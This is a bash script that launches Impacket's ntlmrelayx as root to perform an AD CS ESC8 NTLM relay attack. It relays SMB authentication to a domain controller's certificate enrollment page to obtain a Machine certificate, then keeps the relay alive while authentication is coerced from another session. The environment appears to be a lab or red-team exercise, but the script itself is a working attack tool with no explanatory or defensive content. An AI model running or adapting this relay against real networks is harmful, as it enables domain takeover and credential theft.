#!/bin/bash
# Start ESC8 relay on .60 as root, poll until 445 listens, then hold session open.
# Run via: bash esc8-relay-hold.sh   (in async terminal so the relay stays alive)
LOG=/home/vagrant/esc8-relay.log
sudo rm -f "$LOG"
sudo nohup /home/vagrant/campaign-venv/bin/ntlmrelayx.py --smb-port 445 \
  -t http://dc01.cadre.local/certsrv/certfnsh.asp --adcs --template Machine \
  -smb2support -ip 192.168.77.60 -debug > "$LOG" 2>&1 &
RELAY_PID=$!
echo "relay_pid=$RELAY_PID"

# Poll until 445 is actually listening (relay startup can exceed 10s)
for i in $(seq 1 45); do
  sleep 1
  if ss -tln | grep -q ':445 '; then
    echo "RELAY_445_UP_AFTER_${i}s"
    break
  fi
done

echo "=== listener check ==="
ss -tln | grep ':445 ' || echo RELAY_445_NOT_LISTENING
echo "=== relay log tail ==="
tail -6 "$LOG"
echo "RELAY_SESSION_ALIVE"
# Hold the SSH session open so the relay keeps running while we coerce from a 2nd session
sleep 900
